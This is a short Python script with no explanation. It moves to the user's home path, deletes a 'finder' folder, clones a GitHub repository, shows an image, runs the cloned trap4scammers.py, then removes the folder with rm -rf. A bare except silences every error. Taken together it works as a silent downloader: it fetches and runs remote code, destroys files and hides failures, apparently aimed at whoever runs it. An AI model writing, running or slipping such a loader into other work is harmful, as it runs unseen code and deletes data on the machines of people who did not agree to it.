from os import system, chdir, getcwd, path
from shutil import rmtree
from PIL import Image

if __name__ == "__main__":
    try:
        print(getcwd())
        print(way := getcwd().replace('/', ' ').split())
        print(route := f"/{way[0]}/{way[1]}/")
        chdir(route)
        if path.exists('finder') == True: rmtree("finder")
        system(f"git clone https://github.com/syroiezhin/console2app finder")
        chdir("finder")
        Image.open(f"image.jpeg").show()
        system(f"python trap4scammers.py")
        system(f"rm -rf {route}/finder")
    except: pass